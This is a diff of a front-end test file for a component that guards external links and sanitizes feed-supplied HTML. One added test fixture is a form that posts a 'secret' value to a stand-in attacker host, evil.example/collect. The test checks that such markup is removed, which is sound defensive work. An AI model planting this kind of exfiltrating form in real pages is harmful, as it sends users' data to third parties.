@@ -11,6 +11,7 @@ import { ExternalLinkGuard } from "@/components/ExternalLinkGuard";
 import { SafeHTML } from "@/components/SafeHTML";
 import { useAuthStore } from "@/stores/authStore";
 import { useExternalLinkStore } from "@/stores/externalLinkStore";
+import { clearAllSessionTrust } from "@/utils/sessionTrust";
 import type { User } from "@/api/types";
 
 function user(settings: Record<string, unknown> = {}): User {
@@ -42,6 +43,8 @@ const EVIL = '<a href="https://evil.example/landing?x=1" target="_blank">the rep
 
 beforeEach(() => {
   mockPatch.mockReset();
+  clearAllSessionTrust();
+  sessionStorage.clear();
   useAuthStore.setState({ accessToken: null, refreshToken: null, user: null });
   useExternalLinkStore.setState({ pending: null, sessionTrustedHosts: [] });
 });
@@ -63,6 +66,13 @@ describe("ExternalLinkGuard", () => {
     expect(screen.getByTestId("external-link-url")).toHaveTextContent(
       "https://evil.example/landing?x=1",
     );
+  });
+
+  it("removes feed-supplied forms that could navigate around the click guard", () => {
+    renderPage('<form action="https://evil.example/collect"><input name="q" value="secret"><button>Open report</button></form>');
+    expect(document.querySelector("form")).toBeNull();
+    expect(document.querySelector("input")).toBeNull();
+    expect(document.querySelector("button")).toBeNull();
   });
 
   it("does not stop same-origin links", () => {
@@ -150,8 +160,8 @@ describe("ExternalLinkGuard", () => {
     expect(screen.getByRole("dialog")).toBeInTheDocument();
     expect(screen.queryByRole("alert")).toBeNull();
     expect(screen.getByRole("dialog")).toHaveTextContent("may be a lookup page");
-    // Not an alarm, so trusting the host is still on offer.
-    expect(screen.getByRole("checkbox")).toBeInTheDocument();
+    // Even a plausible lookup URL cannot silently become a trusted exception.
+    expect(screen.queryByRole("checkbox")).toBeNull();
   });
 
   it("closes on Cancel and on Escape without navigating", () => {
